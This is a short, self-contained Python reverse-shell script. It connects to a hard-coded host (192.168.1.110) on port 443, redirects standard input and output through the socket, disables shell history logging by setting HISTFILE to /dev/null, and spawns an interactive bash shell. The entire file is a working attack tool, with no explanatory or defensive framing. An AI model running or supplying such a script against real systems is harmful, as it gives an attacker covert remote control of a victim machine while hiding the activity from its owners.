#!/usr/bin/python
def con():
        import socket, time,pty, os
        host='192.168.1.110'
        port=443
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.settimeout(10)
        s.connect((host,port))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        os.putenv("HISTFILE",'/dev/null')
        pty.spawn("/bin/bash")
        s.close()
con()
